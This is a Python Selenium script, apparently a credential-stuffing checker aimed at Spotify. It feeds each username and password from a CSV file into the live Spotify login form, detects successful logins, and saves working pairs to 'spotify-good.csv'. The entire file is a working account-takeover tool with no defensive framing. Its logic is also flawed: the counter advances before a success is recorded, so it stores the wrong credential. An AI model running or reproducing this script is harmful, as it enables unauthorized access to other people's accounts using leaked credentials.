from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from models import Credential
import time
import random
import colorama
from colorama import Fore, Style
import csv

colorama.init()
creds = Credential.from_csv(file_name="spotify.csv")
firefox_binary = FirefoxBinary('C:\\Users\\abdul\\AppData\\Local\\Mozilla Firefox\\firefox.exe')
driver = webdriver.Firefox(firefox_binary=firefox_binary)
driver.get("https://accounts.spotify.com/en/login/")
counter = 0
success = []
for x in range(len(creds)):
    time.sleep(2)
    print(f"Trying email:{creds[counter].uname} password:{creds[counter].passwd}")

    email_field = driver.find_element_by_id("login-username")
    email_field.clear()
    email_field.send_keys(creds[counter].uname)

    password_field = driver.find_element_by_id("login-password")
    password_field.clear()
    password_field.send_keys(creds[counter].passwd)

    submit_button = driver.find_elements_by_id("login-button")
    submit_button[0].click()
    counter+=1
    time.sleep(3)
    try:
        logout = driver.find_element_by_xpath("/html/body/div/div[2]/div/div/div[5]/div/button")
        logout.click()
        print("SUCCESS")
        success.append({'uname':creds[counter].uname,'passwd':creds[counter].passwd})
        time.sleep(1)
        login = driver.find_element_by_xpath("//*[@id='login-btn-link']")
        login.click()
    except Exception as e:
        print("FAIL")
    time.sleep(1)
driver.close()
print(success)
with open("spotify-good.csv", "w", newline='') as login_csv:
    head = ['uname', 'passwd']
    writer = csv.DictWriter(login_csv, fieldnames=head)
    writer.writeheader()
    for cred in success:
        writer.writerow(cred)
